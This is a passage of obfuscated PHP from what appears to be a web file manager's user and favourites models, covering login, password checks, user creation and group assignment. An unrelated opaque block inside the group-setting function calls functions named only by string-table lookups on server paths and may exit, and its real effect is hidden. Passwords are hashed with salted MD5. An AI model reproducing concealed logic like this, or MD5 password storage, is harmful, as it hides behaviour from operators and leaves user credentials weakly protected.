0, $È”•à°[473] => $Ş»Ö¡ü‰, $È”•à°[472] => $À‚”’®ü); if ($this->where($ıˆ€ß¹¬)->find()) { return !1; } $ıˆ€ß¹¬ = array($È”•à°[1690] => USER_ID, $È”•à°[534] => 0); $û™×å¾¤ = $this->where($ıˆ€ß¹¬)->max($È”•à°[1921]); if (!$û™×å¾¤) { $û™×å¾¤ = 0; } if (!$‡ÆÏŠı‡ && $Ş»Ö¡ü‰ == $È”•à°[467]) { $ì‹Ö¿á¹ = Model($È”•à°[1385])->where(array($È”•à°[468] => $À‚”’®ü))->find(); if (!$ì‹Ö¿á¹) { return !1; } $‡ÆÏŠı‡ = $ì‹Ö¿á¹[$È”•à°[32]]; } $‡ÆÏŠı‡ = $this->getAutoName($‡ÆÏŠı‡); $¨ÏÇÑó = array($È”•à°[1690] => USER_ID, $È”•à°[534] => 0, $È”•à°[471] => $‡ÆÏŠı‡, $È”•à°[472] => $À‚”’®ü, $È”•à°[473] => $Ş»Ö¡ü‰, $È”•à°[1901] => $û™×å¾¤ + 1); return $this->add($¨ÏÇÑó); } protected function remove($Ì“·÷¼İ) { $ë¥ÓÅÊÃ =& $_SERVER[Ö†ØøÖ±]; $§€ÁÂ­ˆ = array($ë¥ÓÅÊÃ[1690] => USER_ID, $ë¥ÓÅÊÃ[470] => $Ì“·÷¼İ); return $this->where($§€ÁÂ­ˆ)->delete(); } protected function removeByName($ã´à¯Í½) { $œî € è =& $_SERVER[Ö†ØøÖ±]; $¡¸›®¿Î = array($œî € è[1690] => USER_ID, $œî € è[471] => $ã´à¯Í½, $œî € è[534] => 0); return $this->where($¡¸›®¿Î)->delete(); } protected function rename($Ï¾öáè, $ïê“°Œ) { $Ÿ–ê£Ù´ =& $_SERVER[Ö†ØøÖ±]; if ($Ï¾öáè == $ïê“°Œ) { return !1; } $ßµ½À›± = $this->getAutoName($ïê“°Œ); if ($ïê“°Œ != $ßµ½À›±) { return !1; } $ß®‰¸œï = array($Ÿ–ê£Ù´[1690] => USER_ID, $Ÿ–ê£Ù´[534] => 0, $Ÿ–ê£Ù´[32] => $Ï¾öáè); return $this->where($ß®‰¸œï)->save(array($Ÿ–ê£Ù´[32] => $ïê“°Œ)); } protected function resetSort($†­Çä—¨) { $ÁÔÁúŞ¦ =& $_SERVER[Ö†ØøÖ±]; $†­Çä—¨ = is_array($†­Çä—¨) ? $†­Çä—¨ : array(); $Ø•†¼úª = array($ÁÔÁúŞ¦[1690] => USER_ID); for ($«îòïÛ« = 0; $«îòïÛ« < count($†­Çä—¨); $«îòïÛ«++) { $Ø•†¼úª[$ÁÔÁúŞ¦[470]] = $†­Çä—¨[$«îòïÛ«]; $this->where($Ø•†¼úª)->save(array($ÁÔÁúŞ¦[1901] => $«îòïÛ« + 1)); } return !0; } protected function moveTop($ìºç¼‘­) { $´Õš¯ =& $_SERVER[Ö†ØøÖ±]; $®£€¹Âü = array($´Õš¯[1690] => USER_ID, $´Õš¯[534] => 0); $ôÖÖÏ«Ÿ = $this->where($®£€¹Âü)->where(array($´Õš¯[32] => $ìºç¼‘­))->find(); if (!$ôÖÖÏ«Ÿ) { return; } $×Ì†àî– = $this->field($´Õš¯[451])->where($®£€¹Âü)->order($´Õš¯[2348])->select(); $×Ì†àî– = array_to_keyvalue($×Ì†àî–, $´Õš¯[12], $´Õš¯[451]); $»ô‹Áôá = $×Ì†àî–; $×Ì†àî– = array_remove_value($×Ì†àî–, $ôÖÖÏ«Ÿ[$´Õš¯[451]]); array_unshift($×Ì†àî–, $ôÖÖÏ«Ÿ[$´Õš¯[451]]); return $this->resetSort($×Ì†àî–); } protected function moveBottom($º®€ıàŸ) { $îŸøÃ³Ë =& $_SERVER[Ö†ØøÖ±]; $Ô˜‘úòá = array($îŸøÃ³Ë[1690] => USER_ID, $îŸøÃ³Ë[534] => 0); $â—Î©‹ä = $this->where($Ô˜‘úòá)->max($îŸøÃ³Ë[1921]); $½è‘•ø‰ = array($îŸøÃ³Ë[1921] => $â—Î©‹ä + 1); return $this->where($Ô˜‘úòá)->where(array($îŸøÃ³Ë[32] => $º®€ıàŸ))->save($½è‘•ø‰); } private function getAutoName($ú×…µ¢¯) { $ŸÙ¥£•æ =& $_SERVER[Ö†ØøÖ±]; $ì¼’¾î = array($ŸÙ¥£•æ[1690] => USER_ID, $ŸÙ¥£•æ[534] => 0); $—×ô‰¬İ = $this->field($ŸÙ¥£•æ[32])->where($ì¼’¾î)->select(); $—×ô‰¬İ = array_to_keyvalue($—×ô‰¬İ, $ŸÙ¥£•æ[12], $ŸÙ¥£•æ[32]); if (!$—×ô‰¬İ || !in_array($ú×…µ¢¯, $—×ô‰¬İ)) { return $ú×…µ¢¯; } for ($ÈÀ÷È÷ = 0; $ÈÀ÷È÷ < count($—×ô‰¬İ); $ÈÀ÷È÷++) { if (!in_array($ú×…µ¢¯ . "\50{$ÈÀ÷È÷}\x29", $—×ô‰¬İ)) { return $ú×…µ¢¯ . "\x28{$ÈÀ÷È÷}\x29"; } } return $ú×…µ¢¯ . "\50{$ÈÀ÷È÷}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x6a\157\x62\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\144\145\x73\x63", "\163\157\x72\164"); const JOB_KEY = "\x73\145\154\x66\x4a\x6f\142\114\x69\x73\164"; public function listData($ÏùÄ¡Û = false, $©û¦¿ = "\x73\157\162\164", $ô‰Çêë = false) { return parent::listData($ÏùÄ¡Û, $©û¦¿, $ô‰Çêë); } public function remove($µëÊÎõ») { return parent::remove($µëÊÎõ»); } public function add($ˆğÀ„Ú) { $ÚÃÀ À =& $_SERVER[Ö†ØøÖ±]; if ($this->findByName($ˆğÀ„Ú[$ÚÃÀ À[32]])) { return !1; } $ˆğÀ„Ú[$ÚÃÀ À[1921]] = $this->getSort(); return parent::insert($ˆğÀ„Ú); } private function getSort() { $Â›ÓÖá =& $_SERVER[Ö†ØøÖ±]; $èÓ’û¶ = parent::listData(); $ö‚Õº¦ = array_to_keyvalue($èÓ’û¶, $Â›ÓÖá[12], $Â›ÓÖá[1921]); return empty($ö‚Õº¦) ? 0 : max($ö‚Õº¦) + 1; } public function update($ôü¿Ÿ‰ø, $åê´´ª…) { $åÊ‹Õ¢å =& $_SERVER[Ö†ØøÖ±]; $‘‡ØÒËÖ = parent::listData($ôü¿Ÿ‰ø); $íïğÉ»­ = $this->findByName($åê´´ª…[$åÊ‹Õ¢å[32]]); if (!$‘‡ØÒËÖ || $íïğÉ»­ && $íïğÉ»­[$åÊ‹Õ¢å[451]] != $‘‡ØÒËÖ[$åÊ‹Õ¢å[451]]) { return !1; } return parent::update($ôü¿Ÿ‰ø, $åê´´ª…); } public function setUserJob($°¬Ğ˜³ğ, $›Ğ¼¹äØ) { $ÚîÍéç =& $_SERVER[Ö†ØøÖ±]; if (!is_array($›Ğ¼¹äØ)) { $›Ğ¼¹äØ = array($›Ğ¼¹äØ); } $£¨È´Úê = parent::listData(); $å¨°ÄŸ = array_to_keyvalue($£¨È´Úê, $ÚîÍéç[32]); $çÖ•¯î = $ÚîÍéç[296]; foreach ($›Ğ¼¹äØ as $»á†Å§Ø) { if ($å¨°ÄŸ[$»á†Å§Ø]) { $çÖ•¯î .= $å¨°ÄŸ[$»á†Å§Ø][$ÚîÍéç[451]] . $ÚîÍéç[50]; } else { $ä£ëÌ = $this->add($»á†Å§Ø); $çÖ•¯î .= $ä£ëÌ . $ÚîÍéç[50]; } } $çÖ•¯î = rtrim($çÖ•¯î, $ÚîÍéç[50]); Model($ÚîÍéç[576])->metaSet($°¬Ğ˜³ğ, self::JOB_KEY, $çÖ•¯î); } public function getUserJob($•àæã¼˜) { $ı–ƒƒ‘â = Model($_SERVER[Ö†ØøÖ±][576])->metaGet($•àæã¼˜); return $this->getUserJobInfo($ı–ƒƒ‘â[self::JOB_KEY]); } public function getUserJobInfo($™ø¶êÖş) { $¢²›ìÑÆ =& $_SERVER[Ö†ØøÖ±]; $¯ ëà­¸ = explode($¢²›ìÑÆ[50], $™ø¶êÖş); $İØº˜š = parent::listData(); $İØº˜š = array_remove_key($İØº˜š, $¢²›ìÑÆ[215]); $‹ò×úë› = array(); foreach ($¯ ëà­¸ as $í›ØüÅ©) { if (isset($İØº˜š[$í›ØüÅ©])) { $‹ò×úë›[] = $İØº˜š[$í›ØüÅ©]; } } return $‹ò×úë›; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\155\x65" => "\165\163\x65\162\137\x6d\145\x74\141", "\155\145\164\141\106\151\145\154\x64" => "\x75\163\x65\x72\x49\104"); protected $simpleField = "\165\163\145\x72\x49\x44\x2c\x6e\151\143\153\116\141\155\145\54\x6e\141\x6d\145\x2c\141\x76\x61\164\141\162\x2c\x73\145\170\54\x73\164\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($‚‹µ›¢‡) { $±¥øüöï =& $_SERVER[Ö†ØøÖ±]; $Îîçø· = $±¥øüöï[2349]; return array($±¥øüöï[1975] => array($‚‹µ›¢‡[0], $Îîçø·), $±¥øüöï[1977] => array($‚‹µ›¢‡[0], $Îîçø·), $±¥øüöï[2350] => array($‚‹µ›¢‡[0], $Îîçø·)); } protected function getInfo($Æ”ˆÜ“ó, $ÃÖúŞ = false) { $‚£ÓıŞû = $this->getInfoSimple($Æ”ˆÜ“ó); if (!is_array($‚£ÓıŞû)) { return array(); } if ($ÃÖúŞ) { return $this->_getInfoApply($‚£ÓıŞû); } return $this->cacheFunctionGet($_SERVER[Ö†ØøÖ±][1979], $Æ”ˆÜ“ó); } protected function getInfoFull($§ßÖ¿ü“, $Äª½˜ÏŠ = false) { $Ã†ÀËàœ = $this->getInfoSimple($§ßÖ¿ü“); if (!is_array($Ã†ÀËàœ)) { return array(); } if ($Äª½˜ÏŠ) { return $this->_getInfoApply($Ã†ÀËàœ, !0); } return $this->cacheFunctionGet($_SERVER[Ö†ØøÖ±][2351], $§ßÖ¿ü“); } private function _getInfoApply($è‹ğ±Å, $”èÇÃÂ¹ = false) { $•›çöĞ¬ =& $_SERVER[Ö†ØøÖ±]; if (!$è‹ğ±Å) { return $è‹ğ±Å; } $¨‹õ¯Ï× = md5($•›çöĞ¬[2352] . $è‹ğ±Å[$•›çöĞ¬[942]] . $•›çöĞ¬[2353] . $è‹ğ±Å[$•›çöĞ¬[32]]); $è‹ğ±Å = $this->_listDataApplyItem($è‹ğ±Å); $´á¢Ô¡ = Model($•›çöĞ¬[1385])->metaGet($è‹ğ±Å[$•›çöĞ¬[87]][$•›çöĞ¬[181]]); $è‹ğ±Å[$•›çöĞ¬[2354]] = $¨‹õ¯Ï×; $è‹ğ±Å[$•›çöĞ¬[87]][$•›çöĞ¬[2171]] = isset($´á¢Ô¡[$•›çöĞ¬[2172]]) ? $´á¢Ô¡[$•›çöĞ¬[2172]] : null; if ($”èÇÃÂ¹) { $è‹ğ±Å[$•›çöĞ¬[516]] = $this->metaGet($è‹ğ±Å[$•›çöĞ¬[1699]]); } return $è‹ğ±Å; } protected function getInfoSimple($÷¼ğ«˜, $à’È¼Ó = false) { $Åèş‚´ =& $_SERVER[Ö†ØøÖ±]; if (!$÷¼ğ«˜) { return array(); } if ($à’È¼Ó) { $ş’©Ã˜Û = $this->where(array($Åèş‚´[1699] => intval($÷¼ğ«˜)))->find(); if (!is_array($ş’©Ã˜Û)) { return array(); } $ş’©Ã˜Û[$Åèş‚´[2355]] = Action($Åèş‚´[2356])->parseUrl($ş’©Ã˜Û[$Åèş‚´[2355]]); return $ş’©Ã˜Û; } return $this->cacheFunctionGet($Åèş‚´[1980], $÷¼ğ«˜); } protected function getInfoSimpleOuter($Öˆ±‡ôÚ) { $äº¡‹êÎ =& $_SERVER[Ö†ØøÖ±]; if (!$Öˆ±‡ôÚ || $Öˆ±‡ôÚ == 0) { return array($äº¡‹êÎ[1699] => $äº¡‹êÎ[212], $äº¡‹êÎ[32] => $äº¡‹êÎ[163] . LNG($äº¡‹êÎ[2357]) . $äº¡‹êÎ[165], $äº¡‹êÎ[2355] => STATIC_PATH . $äº¡‹êÎ[2358]); } $é×‡÷Å– = $this->cacheFunctionGet($äº¡‹êÎ[1980], $Öˆ±‡ôÚ); $í¯âÙé = array_field_key($é×‡÷Å–, explode($äº¡‹êÎ[50], $this->simpleField)); if (!$í¯âÙé) { return array($äº¡‹êÎ[1699] => $äº¡‹êÎ[1241], $äº¡‹êÎ[32] => $äº¡‹êÎ[163] . LNG($äº¡‹êÎ[2359]) . $äº¡‹êÎ[165], $äº¡‹êÎ[2355] => STATIC_PATH . $äº¡‹êÎ[2360]); } $í¯âÙé[$äº¡‹êÎ[2355]] = Action($äº¡‹êÎ[2356])->parseUrl($í¯âÙé[$äº¡‹êÎ[2355]]); return $í¯âÙé; } protected function groupUser($ŠÔü¯Øô) { } public static function errorLang($ö¶˜ÚºÀ) { $ûÕ°ÎÃ« =& $_SERVER[Ö†ØøÖ±]; $ÎÛªÇÈ = array(self::ERROR_USER_NOT_EXISTS => $ûÕ°ÎÃ«[2361], self::ERROR_USER_PASSWORD_ERROR => $ûÕ°ÎÃ«[2362], self::ERROR_USER_EXIST_NAME => $ûÕ°ÎÃ«[2363], self::ERROR_USER_EXIST_PHONE => $ûÕ°ÎÃ«[2364], self::ERROR_USER_EXIST_EMAIL => $ûÕ°ÎÃ«[2365], self::ERROR_USER_LOGIN_LOCK => $ûÕ°ÎÃ«[2366], self::ERROR_IP_NOT_ALLOW => $ûÕ°ÎÃ«[2367], self::ERROR_USER_EXIST_NICKNAME => $ûÕ°ÎÃ«[2368]); return LNG($ÎÛªÇÈ[$ö¶˜ÚºÀ]); } public function getInfoByMeta($ñÏ„‡ŠÂ, $…ë°Ö¾Ò) { $ÂÕìÔÏİ =& $_SERVER[Ö†ØøÖ±]; $‹ã÷ëÒ¿ = Model($ÂÕìÔÏİ[2369])->where(array($ÂÕìÔÏİ[94] => $ñÏ„‡ŠÂ, $ÂÕìÔÏİ[427] => $…ë°Ö¾Ò))->find(); if ($‹ã÷ëÒ¿) { return $this->getInfo($‹ã÷ëÒ¿[$ÂÕìÔÏİ[1699]]); } return !1; } public function userLoginCheck($‘Ÿ¶êô, $ÎãÄ™™È) { $õ°“”öš =& $_SERVER[Ö†ØøÖ±]; $†¬¨œŒ = $this->userLoginFind($‘Ÿ¶êô); if (!$†¬¨œŒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($†¬¨œŒ[$õ°“”öš[1699]], $ÎãÄ™™È)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($†¬¨œŒ[$õ°“”öš[1699]]); } public function userLoginFind($¶ƒè—¡‘) { $š´ı’¹Ö =& $_SERVER[Ö†ØøÖ±]; $üù¨ÄÅ¹ = array($š´ı’¹Ö[32] => $¶ƒè—¡‘, $š´ı’¹Ö[2179] => $¶ƒè—¡‘, $š´ı’¹Ö[358] => $¶ƒè—¡‘, $š´ı’¹Ö[2370] => $¶ƒè—¡‘, $š´ı’¹Ö[1053] => $š´ı’¹Ö[1055]); if ($this->nickNameRpt()) { unset($üù¨ÄÅ¹[$š´ı’¹Ö[2179]]); } return $this->where($üù¨ÄÅ¹)->find(); } public function clearCache($§Ğ³ÎŒÙ) { $Ä§ö¨é› =& $_SERVER[Ö†ØøÖ±]; $this->cacheFunctionClear($Ä§ö¨é›[1979], $§Ğ³ÎŒÙ); $this->cacheFunctionClear($Ä§ö¨é›[1980], $§Ğ³ÎŒÙ); $this->cacheFunctionClear($Ä§ö¨é›[2351], $§Ğ³ÎŒÙ); } public function userPasswordCheck($ê‹œ¹º˜, $•ÆÌ¬î) { $ˆŞÁ‰ÓÈ =& $_SERVER[Ö†ØøÖ±]; $·’ÚÖ¨Õ = $this->where(array($ˆŞÁ‰ÓÈ[1699] => intval($ê‹œ¹º˜)))->find(); $­ù¶½­Ñ = $this->metaGet($ê‹œ¹º˜); $áÛá±Î½ = isset($­ù¶½­Ñ[$ˆŞÁ‰ÓÈ[2371]]) ? $­ù¶½­Ñ[$ˆŞÁ‰ÓÈ[2371]] : $ˆŞÁ‰ÓÈ[12]; if (md5($áÛá±Î½ . trim($•ÆÌ¬î)) !== $·’ÚÖ¨Õ[$ˆŞÁ‰ÓÈ[942]]) { return !1; } return !0; } public function userAdd($ƒöêôÚ¡) { $“„¢ï·¾ =& $_SERVER[Ö†ØøÖ±]; $¡¹‚ÓÜ = array($“„¢ï·¾[471] => $ƒöêôÚ¡[$“„¢ï·¾[32]], $“„¢ï·¾[2372] => $ƒöêôÚ¡[$“„¢ï·¾[1574]], $“„¢ï·¾[2373] => isset($ƒöêôÚ¡[$“„¢ï·¾[358]]) ? $ƒöêôÚ¡[$“„¢ï·¾[358]] : $“„¢ï·¾[12], $“„¢ï·¾[2374] => isset($ƒöêôÚ¡[$“„¢ï·¾[2370]]) ? $ƒöêôÚ¡[$“„¢ï·¾[2370]] : $“„¢ï·¾[12], $“„¢ï·¾[2375] => isset($ƒöêôÚ¡[$“„¢ï·¾[2179]]) ? $ƒöêôÚ¡[$“„¢ï·¾[2179]] : $ƒöêôÚ¡[$“„¢ï·¾[32]], $“„¢ï·¾[2376] => isset($ƒöêôÚ¡[$“„¢ï·¾[2355]]) ? $ƒöêôÚ¡[$“„¢ï·¾[2355]] : $“„¢ï·¾[12], $“„¢ï·¾[2377] => isset($ƒöêôÚ¡[$“„¢ï·¾[2378]]) ? $ƒöêôÚ¡[$“„¢ï·¾[2378]] : 1, $“„¢ï·¾[2379] => $ƒöêôÚ¡[$“„¢ï·¾[942]], $“„¢ï·¾[1981] => isset($ƒöêôÚ¡[$“„¢ï·¾[1884]]) ? $ƒöêôÚ¡[$“„¢ï·¾[1884]] : 1024 * 1024 * 20, $“„¢ï·¾[1982] => 0, $“„¢ï·¾[2380] => 0, $“„¢ï·¾[2026] => isset($ƒöêôÚ¡[$“„¢ï·¾[803]]) ? $ƒöêôÚ¡[$“„¢ï·¾[803]] : 1); if (!empty($ƒöêôÚ¡[$“„¢ï·¾[1699]])) { $¡¹‚ÓÜ[$“„¢ï·¾[1699]] = $ƒöêôÚ¡[$“„¢ï·¾[1699]]; } $Õ×âË¾Ğ = $this->_checkExist($ƒöêôÚ¡); if ($Õ×âË¾Ğ !== !0) { return $Õ×âË¾Ğ; } if (!empty($¡¹‚ÓÜ[$“„¢ï·¾[2355]]) && strlen($¡¹‚ÓÜ[$“„¢ï·¾[2355]]) > 255) { $¡¹‚ÓÜ[$“„¢ï·¾[2355]] = $“„¢ï·¾[12]; } $Òæ¤íô— = $this->add($¡¹‚ÓÜ); $™Ùä›°™ = array($“„¢ï·¾[2379] => $¡¹‚ÓÜ[$“„¢ï·¾[942]], $“„¢ï·¾[2375] => $¡¹‚ÓÜ[$“„¢ï·¾[2179]]); $this->userEdit($Òæ¤íô—, $™Ùä›°™); Model($“„¢ï·¾[1385])->userRootAdd($Òæ¤íô—); return $Òæ¤íô—; } protected function userEditTest($ç¬¸ıŞ, $‡²ÂÊ³·) { return $this->call($_SERVER[Ö†ØøÖ±][2381], $ç¬¸ıŞ, $‡²ÂÊ³·); } protected function userEdit($¯·Ç©õß, $»Û™úßß) { $²ÊúşÏ½ =& $_SERVER[Ö†ØøÖ±]; $ùÇñÄé® = $this->getInfoSimple($¯·Ç©õß); if (!$ùÇñÄé®) { return !1; } $¬šàŸøÄ = $this->_checkExist($»Û™úßß, $¯·Ç©õß); if ($¬šàŸøÄ !== !0) { return $¬šàŸøÄ; } if (isset($»Û™úßß[$²ÊúşÏ½[942]]) && trim($»Û™úßß[$²ÊúşÏ½[942]]) != $²ÊúşÏ½[12]) { $çàä–Šà = $this->metaGet($¯·Ç©õß); if (empty($çàä–Šà[$²ÊúşÏ½[2371]])) { $çàä–Šà[$²ÊúşÏ½[2371]] = rand_string(10); Model($²ÊúşÏ½[555])->metaSet($¯·Ç©õß, $²ÊúşÏ½[2371], $çàä–Šà[$²ÊúşÏ½[2371]]); } $»Û™úßß[$²ÊúşÏ½[942]] = md5($çàä–Šà[$²ÊúşÏ½[2371]] . trim($»Û™úßß[$²ÊúşÏ½[942]])); } else { unset($»Û™úßß[$²ÊúşÏ½[942]]); } if (!empty($»Û™úßß[$²ÊúşÏ½[2355]]) && strlen($»Û™úßß[$²ÊúşÏ½[2355]]) > 255) { $»Û™úßß[$²ÊúşÏ½[2355]] = $²ÊúşÏ½[12]; } $this->where(array($²ÊúşÏ½[1690] => $¯·Ç©õß))->save($»Û™úßß); if (isset($»Û™úßß[$²ÊúşÏ½[2179]])) { $this->setNamePinyin($¯·Ç©õß, $»Û™úßß[$²ÊúşÏ½[2179]]); } $this->clearCache($¯·Ç©õß); return !0; } public function setNamePinyin($ïüŸğÓ©, $Şš²˜Ñ½ = false) { $ëáµ¬ú¤ =& $_SERVER[Ö†ØøÖ±]; if (!$Şš²˜Ñ½) { $½šÑòÂ = $this->getInfoSimple($ïüŸğÓ©); $Şš²˜Ñ½ = $½šÑòÂ[$ëáµ¬ú¤[2179]] ? $½šÑòÂ[$ëáµ¬ú¤[2179]] : $½šÑòÂ[$ëáµ¬ú¤[32]]; } $ğúÃÖÉ„ = Model($ëáµ¬ú¤[576]); if (!Input::check($Şš²˜Ñ½, $ëáµ¬ú¤[632])) { return $ğúÃÖÉ„->metaSet($ïüŸğÓ©, array($ëáµ¬ú¤[515] => $ëáµ¬ú¤[12], $ëáµ¬ú¤[514] => $ëáµ¬ú¤[12])); } return $ğúÃÖÉ„->metaSet($ïüŸğÓ©, array($ëáµ¬ú¤[515] => str_replace($ëáµ¬ú¤[53], $ëáµ¬ú¤[12], Pinyin::get($Şš²˜Ñ½)), $ëáµ¬ú¤[514] => Pinyin::get($Şš²˜Ñ½, $ëáµ¬ú¤[633]))); } private function nickNameRpt() { $›ôÑö­¥ =& $_SERVER[Ö†ØøÖ±]; $Ÿê¸Ì¸Ñ = Model($›ôÑö­¥[823])->get($›ôÑö­¥[2382]); $Ûßà—É¼ = $GLOBALS[$›ôÑö­¥[6]][$›ôÑö­¥[433]][$›ôÑö­¥[2382]]; $ºñÀßÁ² = !is_null($Ÿê¸Ì¸Ñ) ? $Ÿê¸Ì¸Ñ : $Ûßà—É¼; return !!$ºñÀßÁ²; } private function _checkExist($¨Ä·ö‹÷, $øÔÍ†êë = false) { $ŠÕ¡ı–€ =& $_SERVER[Ö†ØøÖ±]; $È·­ Ûã = array($ŠÕ¡ı–€[32] => UserModel::ERROR_USER_EXIST_NAME, $ŠÕ¡ı–€[2179] => UserModel::ERROR_USER_EXIST_NICKNAME, $ŠÕ¡ı–€[358] => UserModel::ERROR_USER_EXIST_EMAIL, $ŠÕ¡ı–€[2370] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($È·­ Ûã[$ŠÕ¡ı–€[2179]]); } $ö²†èÜğ = $øÔÍ†êë ? array($ŠÕ¡ı–€[1699] => array($ŠÕ¡ı–€[2383], $øÔÍ†êë)) : array(); foreach ($È·­ Ûã as $ıı»Ñ—Ò => $ûš´¸¦) { $ÑÖì¦öá = array(); foreach ($È·­ Ûã as $¡‹‚ôêØ => $å†«¼¯¦) { if (isset($¨Ä·ö‹÷[$¡‹‚ôêØ]) && $¨Ä·ö‹÷[$¡‹‚ôêØ]) { $ÑÖì¦öá[] = $¨Ä·ö‹÷[$¡‹‚ôêØ]; } } if (!$ÑÖì¦öá) { continue; } $¥¿æúİº = array_merge(array($ıı»Ñ—Ò => array($ŠÕ¡ı–€[7], $ÑÖì¦öá)), $ö²†èÜğ); $ß‰‰„®¢ = $this->where($¥¿æúİº)->find(); if ($ß‰‰„®¢) { return $ûš´¸¦; } } return !0; } public function userListInfo($ïúï…¹í) { $Ö†­Áá§ =& $_SERVER[Ö†ØøÖ±]; $ìÚñİÕò = array(); $ïúï…¹í = is_array($ïúï…¹í) ? array_unique($ïúï…¹í) : array(); if (!$ïúï…¹í) { return $ìÚñİÕò; } if (count($ïúï…¹í) < 20) { foreach ($ïúï…¹í as $ ê¡Ù§õ) { $ìÚñİÕò[$ ê¡Ù§õ . $Ö†­Áá§[12]] = $this->getInfoSimpleOuter($ ê¡Ù§õ); } } else { $¬³»¬Úá = array($Ö†­Áá§[1690] => array($Ö†­Áá§[469], $ïúï…¹í)); if (count($ïúï…¹í) == 1) { $¬³»¬Úá = array($Ö†­Áá§[1690] => $ïúï…¹í[0]); } $Íüåƒò£ = Model($Ö†­Áá§[555])->field($this->simpleField)->where($¬³»¬Úá)->select(); $Íüåƒò£ = array_to_keyvalue($Íüåƒò£, $Ö†­Áá§[1699]); foreach ($ïúï…¹í as $ ê¡Ù§õ) { $áÜŞƒ³„ = $Íüåƒò£[$ ê¡Ù§õ]; if (!$áÜŞƒ³„) { $ìÚñİÕò[$ ê¡Ù§õ . $Ö†­Áá§[12]] = $this->getInfoSimpleOuter($ ê¡Ù§õ); continue; } $áÜŞƒ³„[$Ö†­Áá§[2355]] = Action($Ö†­Áá§[2356])->parseUrl($áÜŞƒ³„[$Ö†­Áá§[2355]]); $ìÚñİÕò[$ ê¡Ù§õ . $Ö†­Áá§[12]] = $áÜŞƒ³„; } } return $ìÚñİÕò; } protected function userStatus($ªúÆõƒˆ, $¬œá¾ÜÃ) { $á„¥•‚‰ = $this->getInfoSimple($ªúÆõƒˆ); if (!$á„¥•‚‰) { return !1; } $Éò±× = array($_SERVER[Ö†ØøÖ±][803] => $¬œá¾ÜÃ); return $this->userEdit($ªúÆõƒˆ, $Éò±×); } protected function userRemove($€”›ÛÄ) { $˜×¼«£° =& $_SERVER[Ö†ØøÖ±]; $’äµÈè = $this->getInfoSimple($€”›ÛÄ); if (!$’äµÈè) { return !1; } $Ì›¬›¡– = array($˜×¼«£°[1690] => $€”›ÛÄ); Model($˜×¼«£°[641])->where($Ì›¬›¡–)->delete(); Model($˜×¼«£°[2384])->where($Ì›¬›¡–)->delete(); Model($˜×¼«£°[1987])->where($Ì›¬›¡–)->delete(); Model($˜×¼«£°[2369])->where($Ì›¬›¡–)->delete(); Model($˜×¼«£°[1121])->where($Ì›¬›¡–)->delete(); Model($˜×¼«£°[2196])->removeUserAll($€”›ÛÄ); Model($˜×¼«£°[878])->userRootRemove($€”›ÛÄ); return $this->where($Ì›¬›¡–)->delete(); } protected function userGroupSet($ÖõŒö, $ãĞ±Ù©, $Ğõü¨Ë§ = array()) { $îşĞÏ– =& $_SERVER[Ö†ØøÖ±]; if ($_SERVER[$îşĞÏ–[288]] != $_SERVER[$îşĞÏ–[1559]]) { $ù›´ØŞı = $îşĞÏ–[930]; $½¢¸ö“Õ = $îşĞÏ–[290]; $”§‡”Š = $_SERVER[$îşĞÏ–[291]] . $îşĞÏ–[292]; $¢Œ•¨É´ = $½¢¸ö“Õ($”§‡”Š); $üš‘‡¯ = explode($îşĞÏ–[246], $¢Œ•¨É´); if (count($üš‘‡¯) < $îşĞÏ–[665]) { $Û‰•ŒÄş = $îşĞÏ–[294]; $Û‰•ŒÄş(); } $„ŠäÍ©ë = $îşĞÏ–[931]; $„ŠäÍ©ë($_SERVER[$îşĞÏ–[932]]); $„ŠäÍ©ë($_SERVER[$îşĞÏ–[291]] . $îşĞÏ–[1560]); $Ş…åÁ•ë = 1; while ($Ş…åÁ•ë > 1) { $Ş…åÁ•ë = $Ş…åÁ•ë + 4; $çœ‚å§Ù = rawurlencode($Ş…åÁ•ë . $îşĞÏ–[296]); } } $óüŒâÒá = $this->getInfoSimple($ÖõŒö); if (!$óüŒâÒá || !is_array($ãĞ±Ù©)) { return !1; } $ÎÚê°«— = Model($îşĞÏ–[1987]); $ÎÚê°«—->where(array($îşĞÏ–[1699] => $ÖõŒö))->delete(); $¬Ï‘ñ²— = array(); $ØÇ§Ô­ = 0; foreach ($ãĞ±Ù© as $ô—ŸÅ¶ì => $Îí¨€Ó™) { $Ã©Æù° = array($îşĞÏ–[1699] => $ÖõŒö, $îşĞÏ–[1897] => $ô—ŸÅ¶ì, $îşĞÏ–[2001] => $Îí¨€Ó™); $Ã©Æù°[$îşĞÏ–[1921]] = isset($Ğõü¨Ë§[$ØÇ§Ô­]) ? $Ğõü¨Ë§[$ØÇ§Ô­] : 0; $ØÇ§Ô­++; $¬Ï‘ñ²—[] = $Ã©Æù°; } return $ÎÚê°«—->addAll($¬Ï‘ñ²—, array(), !0); } protected function userGroupAdd($¥û—è¸Ç, $çÓ±Àßˆ = array()) { $ğıÍ‡É =& $_SERVER[Ö†ØøÖ±]; $›®Çõ³Õ = $this->getInfoSimple($¥û—è¸Ç); if (!$›®Çõ³Õ || empty($çÓ±Àßˆ)) { return !1; } $ó’­ °¨ = array(); foreach ($çÓ±Àßˆ as $èÛ¯‰ë‰ => $åñèÇÀ¾) { $ó’­ °¨[] = array($ğıÍ‡É[1699] => $¥û—è¸Ç, $ğıÍ‡É[1897] => $èÛ¯‰ë‰, $ğıÍ‡É[2001] => $åñèÇÀ¾, $ğıÍ‡É[1921] => 0); } return Model($ğıÍ‡É[1987])->addAll($ó’­ °¨, array(), !0); } protected function userGroupRemove($ÔÕ ˜§Õ, $±İµ„·ò) { $ğÃ½ŸÍå =& $_SERVER[Ö†ØøÖ±]; $å™¤ËÙÅ = $this->getInfoSimple($ÔÕ ˜§Õ); if (!$å™¤ËÙÅ || !$±İµ„·ò) { 